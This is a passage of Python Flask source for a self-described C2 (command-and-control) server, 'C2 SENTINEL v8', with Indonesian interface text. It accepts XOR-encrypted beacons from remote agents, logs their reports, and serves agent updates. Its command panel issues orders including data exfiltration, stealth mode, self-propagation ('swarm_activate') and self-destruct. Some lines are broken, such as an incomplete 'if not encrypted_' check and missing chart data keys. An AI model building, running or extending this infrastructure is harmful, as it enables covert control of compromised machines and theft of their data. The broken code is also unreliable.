            // Animate connection lines
            lines.forEach((line, i) => {{
                line.material.opacity = 0.5 + Math.sin(Date.now() * 0.002 + i) * 0.3;
            }});
            
            controls.update();
            renderer.render(scene, camera);
        }}
        animate();

        // Resize handler
        window.addEventListener('resize', () => {{
            camera.aspect = container.clientWidth / container.clientHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(container.clientWidth, container.clientHeight);
        }});

        // Add info panel
        const info = document.createElement('div');
        info.style.position = 'absolute';
        info.style.top = '10px';
        info.style.left = '10px';
        info.style.color = '#00ff00';
        info.style.fontFamily = 'monospace';
        info.style.padding = '10px';
        info.style.backgroundColor = 'rgba(0,20,0,0.7)';
        info.style.border = '1px solid #00ff00';
        info.innerHTML = '<h4>🖱️ Controls:</h4><p>- Drag: Rotate<br>- Scroll: Zoom<br>- Double Click: Toggle Auto-Rotate</p>';
        container.appendChild(info);
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

@app.route('/agents')
def agents_live():
    now = datetime.now()
    agents_html = ""
    for agent_id in AGENT_LAST_SEEN.keys():
        last_seen = AGENT_LAST_SEEN[agent_id]
        status = "online" if (now - last_seen).total_seconds() < 300 else "offline"
        AGENT_STATUS[agent_id] = status
        time_str = last_seen.strftime("%Y-%m-%d %H:%M:%S")
        sev_tag = ""
        try:
            with open(REPORT_FILE, "r") as f:
                reports = json.load(f)
                agent_reports = [r for r in reports if r.get("id") == agent_id]
                high_count = sum(1 for r in agent_reports if is_high_severity(r))
                if high_count > 0:
                    sev_tag = f'<span class="tag tag-high">HIGH x{high_count}</span>'
                if "swarm" in str(agent_reports[-1].get("status", "")) if agent_reports else "":
                    sev_tag += ' <span class="tag tag-swarm">SWARM</span>'
        except:
            pass

        agents_html += f'''
        <div style="border: 1px solid rgba(0,255,0,0.2); margin: 15px 0; padding: 15px; border-radius: 8px; background: rgba(0,25,0,0.5);">
            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
                <div>
                    <b style="font-size: 1.1em;">{agent_id}</b> 
                    <span class="status-{status}">● {status.upper()}</span>
                    {sev_tag}
                </div>
                <div>
                    <a href="/command?agent_id={agent_id}"><button>Perintah</button></a>
                </div>
            </div>
            <div style="margin-top: 8px; font-size: 0.9em;">
                <small>Terakhir: {time_str} | IP: {AGENT_SWARM_MAP.get(agent_id, {{}}).get("ip", "unknown")}</small>
            </div>
        </div>
        '''

    content = f'''
    <h2>👾 AGENT LIVE STATUS — REAL-TIME MONITORING</h2>
    <div style="background: rgba(0, 30, 0, 0.7); padding:20px; border-radius:10px; border: 1px solid #00ff00;">
        {agents_html if agents_html else "<i style='color: #666;'>Tidak ada agent terdaftar.</i>"}
    </div>
    <p><small>Auto-update via WebSocket — no refresh needed.</small></p>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

@app.route('/command', methods=['GET', 'POST'])
def command_panel():
    if request.method == 'POST':
        agent_id = request.form.get('agent_id')
        cmd = request.form.get('cmd')
        note = request.form.get('note', '')
        if agent_id and cmd:
            ACTIVE_COMMANDS[agent_id] = {
                "cmd": cmd,
                "note": note,
                "timestamp": datetime.now().isoformat(),
                "issued_by": "admin"
            }
            # Emit via WebSocket
            socketio.emit('command_issued', {"agent_id": agent_id, "cmd": cmd})
            return f'''
            <script>
                alert("✅ Perintah '{cmd}' terkirim ke {agent_id}!");
                window.location.href="/command";
            </script>
            '''

    prefill_id = request.args.get('agent_id', '')
    commands_html = ""
    for aid, cmd in list(ACTIVE_COMMANDS.items()):
        try:
            issued = datetime.fromisoformat(cmd["timestamp"]).strftime("%H:%M:%S")
            expire_in = int(COMMAND_EXPIRY - (datetime.now() - datetime.fromisoformat(cmd["timestamp"])).total_seconds())
            if expire_in < 0:
                continue
            status = "⏳" if expire_in > 60 else "⚠️"
            commands_html += f"<li><b>{aid}</b>: <code>{cmd['cmd']}</code> {status} <small>({expire_in}s)</small><br><i>{cmd.get('note','')}</i></li>"
        except:
            pass

    content = f'''
    <h2>🎯 COMMAND CENTER — NEURAL SWARM CONTROL</h2>
    <form method="post">
        <label>🆔 Agent ID:</label><br>
        <input type="text" name="agent_id" value="{prefill_id}" required><br><br>
        
        <label>🕹️ Perintah:</label><br>
        <select name="cmd">
            <option value="idle">🔄 idle - Mode standby</option>
            <option value="scan">🔍 scan - Deep network scan</option>
            <option value="exfil">📤 exfil - Data exfiltration</option>
            <option value="update">🆙 update - Self-update agent</option>
            <option value="kill">💀 kill - Self-destruct</option>
            <option value="swarm_activate">🕸️ swarm_activate - Activate neural propagation</option>
            <option value="silent_mode">👻 silent_mode - Stealth operation</option>
            <option value="decoy_activate">🪤 decoy_activate - Deploy honeypot</option>
        </select><br><br>
        
        <label>📝 Catatan (Opsional):</label><br>
        <input type="text" name="note" placeholder="Contoh: fokus ke subnet 192.168.2.0"><br><br>
        
        <button type="submit">🚀 KIRIM PERINTAH — NEURAL CONFIRMED</button>
    </form>
    
    <h3>📌 PERINTAH AKTIF (Auto-expire dalam 5 menit)</h3>
    <ul style="font-family: 'Courier New'; font-size: 0.95em;">{commands_html if commands_html else "<i>Tidak ada perintah aktif.</i>"}</ul>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

@app.route('/reports')
def list_reports():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        reports.reverse()

        export_links = '''
        <p>
            <a href="/export?format=json"><button>💾 Export JSON</button></a>
            <a href="/export?format=csv"><button>📊 Export CSV</button></a>
        </p>
        '''

        # Format reports with syntax highlighting
        formatted_reports = []
        for r in reports[:50]:
            severity = "🔴 HIGH" if is_high_severity(r) else "🟢 LOW"
            sev_class = "tag-high" if is_high_severity(r) else ""
            formatted_reports.append(f'''
<div style="margin: 15px 0; padding: 15px; border-left: 4px solid {'#ff3366' if is_high_severity(r) else '#00ff00'}; background: rgba(0,20,0,0.5);">
    <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
        <div><b>Agent:</b> {r.get("id", "unknown")}</div>
        <div><span class="tag {sev_class}">{severity}</span></div>
    </div>
    <div><b>Issue:</b> {r.get("issue", "N/A")}</div>
    <div><b>Target:</b> {r.get("target", "N/A")}</div>
    <div><small><b>Time:</b> {r.get("timestamp", "N/A")} | IP: {r.get("beacon_ip", "N/A")}</small></div>
</div>
            ''')

        content = f'''
        <h2>📁 LAPORAN AGENT — NEURAL ARCHIVE</h2>
        {export_links}
        <div class="terminal" id="reportTerminal">
            {"".join(formatted_reports) if formatted_reports else "<i style='color: #666;'>Belum ada laporan.</i>"}
        </div>
        {export_links}
        '''
        return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
    except Exception as e:
        return f"<h2>❌ Error</h2><pre>{e}</pre>"

@app.route('/export')
def export_reports():
    fmt = request.args.get('format', 'json')
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if fmt == 'csv':
            import csv
            from io import StringIO
            output = StringIO()
            writer = csv.writer(output)
            if reports:
                keys = reports[0].keys()
                writer.writerow(keys)
                for r in reports:
                    writer.writerow([r.get(key, "") for key in keys])
            output.seek(0)
            return output.getvalue(), 200, {
                'Content-Type': 'text/csv',
                'Content-Disposition': 'attachment; filename=reports.csv'
            }
        else:
            return jsonify(reports)
    except Exception as e:
        return str(e), 500

@app.route('/logs')
def live_logs():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        reports.reverse()
        logs = []
        for r in reports[:100]:
            ts = r.get("timestamp", "N/A")
            agent = r.get("id", "unknown")
            issue = r.get("issue", "N/A")
            severity = "🔴 HIGH" if is_high_severity(r) else "🟢 LOW"
            sev_color = "#ff3366" if is_high_severity(r) else "#00ff00"
            logs.append(f'<span style="color:{sev_color};">[{ts}]</span> <b>[{agent}]</b> {severity} | {issue}')

        content = f'''
        <h2>📜 LIVE LOGS — NEURAL FEED</h2>
        <div class="terminal" id="logTerminal">
            <div id="logContent" style="color:#00ff00; font-family: 'Courier New';">
                {"".join(f"<div>{log}</div>" for log in logs) if logs else "<i>Belum ada log.</i>"}
            </div>
        </div>
        <p><small>Real-time update via WebSocket — no refresh needed.</small></p>
        '''
        return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
    except Exception as e:
        return str(e)

@app.route('/beacon', methods=['POST'])
def beacon():
    encrypted_data = request.form.get('data')
    if not encrypted_  # ✅ FIXED: was "if not encrypted:"
        return "Invalid", 400

    decrypted = xor_decrypt(encrypted_data)
    if not decrypted:
        return "Forbidden", 403

    try:
        data = json.loads(decrypted)
        agent_id = data.get("id", "unknown")
        data["timestamp"] = datetime.now().isoformat()
        data["beacon_ip"] = request.remote_addr

        # Update last seen & swarm map
        AGENT_LAST_SEEN[agent_id] = datetime.now()

        # Simpan ke swarm map (simulasi genealogy)
        if agent_id not in AGENT_SWARM_MAP:
            # Cari "parent" acak dari agent yang sudah ada
            existing_agents = list(AGENT_SWARM_MAP.keys())
            parent = random.choice(existing_agents) if existing_agents else "ROOT"
            AGENT_SWARM_MAP[agent_id] = {
                "parent": parent,
                "children": [],
                "ip": data.get("ip", "unknown"),
                "first_seen": data["timestamp"]
            }
            if parent != "ROOT" and parent in AGENT_SWARM_MAP:
                AGENT_SWARM_MAP[parent]["children"].append(agent_id)

        # Simpan laporan
        with open(REPORT_FILE, "r+") as f:
            try:
                reports = json.load(f)
                if not isinstance(reports, list):
                    reports = []
            except:
                reports = []
            reports.append(data)
            # Batasi jumlah laporan
            if len(reports) > MAX_REPORTS:
                reports = reports[-MAX_REPORTS:]
            f.seek(0)
            json.dump(reports, f, indent=2, ensure_ascii=False)
            f.truncate()

        # AI Filter & Alert
        if is_high_severity(data):
            alert = f"🚨 <b>BUG KRITIS DITEMUKAN!</b>\n"
            alert += f"🆔 Agent: {agent_id}\n"
            alert += f"🎯 Target: {data.get('target', 'unknown')}\n"
            alert += f"🔧 Issue: {data.get('issue', 'unknown')}\n"
            alert += f"💰 Potensi Bounty: HIGH\n"
            alert += f"🕒 Waktu: {data['timestamp']}"
            send_alert(alert)
            # Emit alert via WebSocket
            socketio.emit('new_alert', {"message": f"Critical issue found by {agent_id}: {data.get('issue', 'unknown')}"})

        # Kirim perintah
        cmd = ACTIVE_COMMANDS.get(agent_id, {"cmd": "idle"})
        if agent_id in ACTIVE_COMMANDS:
            del ACTIVE_COMMANDS[agent_id]

        # Emit dashboard update
        online_count = sum(1 for agent_id, last_seen in AGENT_LAST_SEEN.items() 
                          if (datetime.now() - last_seen).total_seconds() < 300)
        socketio.emit('update_dashboard', {"agents_online": online_count})

        return jsonify(cmd)

    except Exception as e:
        print(f"[BEACON ERROR] {e}")
        return "Error", 500

@app.route('/update', methods=['GET'])
def update():
    update_file = "agent_new.py"
    if not os.path.exists(update_file):
        with open(update_file, "w") as f:
            f.write('''print("✅ Agent updated to v8.0 - NEURAL SWARM ULTIMATE EDITION!")\n''')
    return send_file(update_file)

@app.route('/analytics')
def analytics():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if not isinstance(reports, list):
            reports = []
    except:
        reports = []

    ai_insight = neural_ai_analyze(reports)

    # Prepare data for charts
    issue_types = {}
    targets = {}
    for r in reports[:200]:  # limit for performance
        issue = r.get("issue", "Unknown")[:30]
        issue_types[issue] = issue_types.get(issue, 0) + 1
        target = r.get("target", "Unknown").split('/')[2] if '//' in r.get("target", "") else r.get("target", "Unknown")[:25]
        targets[target] = targets.get(target, 0) + 1

    # Sort and limit to top 10
    issue_items = sorted(issue_types.items(), key=lambda x: x[1], reverse=True)[:10]
    target_items = sorted(targets.items(), key=lambda x: x[1], reverse=True)[:10]

    issue_labels = [item[0] for item in issue_items]
    issue_data = [item[1] for item in issue_items]
    target_labels = [item[0] for item in target_items]
    target_data = [item[1] for item in target_items]

    chart_labels = [item["time"] for item in AGENT_CHECKINS]
    chart_data = [item["online"] for item in AGENT_CHECKINS]

    content = f'''
    <h2>📈 NEURAL ANALYTICS & PREDICTION ENGINE</h2>

    <div class="ai-insight">
        <h3>🧠 NEURAL AI EXECUTIVE SUMMARY</h3>
        <pre style="color:#ff00ff; white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
        <p style="color: #ffff00; font-weight: bold; font-size: 1.2em;">🔮 PREDIKSI: {ai_insight["prediction"]}</p>
    </div>

    <div class="grid">
        <div class="card">
            <h3>📊 Top 10 Issue Types</h3>
            <div class="chart-container">
                <canvas id="issueChart"></canvas>
            </div>
        </div>
        <div class="card">
            <h3>🎯 Top 10 Targets</h3>
            <div class="chart-container">
                <canvas id="targetChart"></canvas>
            </div>
        </div>
    </div>

    <div class="card">
        <h3>📈 Agent Online Trend (60 Menit)</h3>
        <div class="chart-container">
            <canvas id="agentTrendChart"></canvas>
        </div>
    </div>

    <script>
        const issueCtx = document.getElementById('issueChart').getContext('2d');
        new Chart(issueCtx, {{
            type: 'bar',
             {{
                labels: {json.dumps(issue_labels)},
                datasets: [{{
                     {json.dumps(issue_data)},
                    backgroundColor: Array({len(issue_labels)}).fill().map((_, i) => `hsla(${{i * 36}}, 100%, 50%, 0.7)`),
                    borderColor: Array({len(issue_labels)}).fill().map((_, i) => `hsla(${{i * 36}}, 100%, 50%, 1)`),
                    borderWidth: 2
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ display: false }},
                    tooltip: {{
                        backgroundColor: 'rgba(0, 30, 0, 0.9)',
                        titleColor: '#00ff00',
                        bodyColor: '#ffffff'
                    }}
                }},
                scales: {{
                    x: {{ 
                        ticks: {{ color: '#00ff00' }},
                        grid: {{ color: 'rgba(0, 255, 0, 0.1)' }}
                    }},
                    y: {{ 
                        beginAtZero: true, 
                        ticks: {{ color: '#00ff00' }},
                        grid: {{ color: 'rgba(0, 255, 0, 0.1)' }}
                    }}
                }},
                animation: {{
                    duration: 1500,
                    easing: 'easeOutBounce'
                }}
            }}
        }});

        const targetCtx = document.getElementById('targetChart').getContext('2d');
        new Chart(targetCtx, {{
            type: 'doughnut',
             {{
                labels: {json.dumps(target_labels)},
                datasets: [{{
                     {json.dumps(target_data)},
                    backgroundColor: [
                        'rgba(0, 255, 0, 0.8)',
                        'rgba(0, 200, 50, 0.8)',
                        'rgba(0, 150, 100, 0.8)',
                        'rgba(0, 100, 150, 0.8)',
                        'rgba(0, 50, 200, 0.8)',
                        'rgba(50, 0, 200, 0.8)',
                        'rgba(100, 0, 150, 0.8)',
                        'rgba(150, 0, 100, 0.8)',
                        'rgba(200, 0, 50, 0.8)',
                        'rgba(255, 0, 0, 0.8)'
                    ],
                    borderColor: '#000000',
                    borderWidth: 1
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ 
                        labels: {{ 
                            color: '#00ff00',
                            font: {{ size: 12 }}
                        }}
                    }},
                    tooltip: {{
                        backgroundColor: 'rgba(0, 30, 0, 0.9)',
                        titleColor: '#00ff00',
                        bodyColor: '#ffffff'
                    }}
                }},
                animation: {{
                    animateRotate: true,
                    animateScale: true,
                    duration: 2000
                }}
            }}
        }});

        const trendCtx = document.getElementById('agentTrendChart').getContext('2d');
        new Chart(trendCtx, {{
            type: 'line',
             {{
                labels: {json.dumps(chart_labels)},
                datasets: [{{
                    label: 'Agent Online',
                     {json.dumps(chart_data)},
                    borderColor: '#00ff00',
                    backgroundColor: 'rgba(0, 255, 0, 0.1)',
                    tension: 0.3,
                    pointBackgroundColor: '#ff00ff',
                    pointBorderColor: '#ffffff',
                    pointRadius: 4,
                    fill: true
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ 
                        labels: {{ 
                            color: '#00ff00',
                            font: {{ size: 14 }}
                        }}
                    }},
                    tooltip: {{
                        backgroundColor: 'rgba(0, 30, 0, 0.9)',
                        titleColor: '#00ff00',
                        bodyColor: '#ffffff'
                    }}
                }},
                scales: {{
                    x: {{ 
                        ticks: {{ color: '#00ff00' }},
                        grid: {{ color: 'rgba(0, 255, 0, 0.1)' }}
                    }},
                    y: {{ 
                        beginAtZero: true, 
                        ticks: {{ color: '#00ff00' }},
                        grid: {{ color: 'rgba(0, 255, 0, 0.1)' }}
                    }}
                }},
                animation: {{
                    duration: 2000,
                    easing: 'easeInOutQuart'
                }}
            }}
        }});
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=ai_insight.get("risk_score", 0))

# === SOCKET.IO EVENTS ===
@socketio.on('connect')
def handle_connect():
    print('Client connected to WebSocket')
    SOCKETS.append(request.sid)

@socketio.on('disconnect')
def handle_disconnect():
    SOCKETS.remove(request.sid) if request.sid in SOCKETS else None

# === RUN ===
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8000))
    print("🚀🚀🚀 C2 SENTINEL v8 - NEURAL SWARM ULTIMATE EDITION")
    print(f"🌐 Running on http://0.0.0.0:{port}")
    print("🔐 XOR Key: 'sentinel'")
    print("📡 WebSocket enabled for real-time updates")
    print("🧹 Auto-cleanup enabled for agents & commands")
    print("🤖 Neural AI engine active")
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)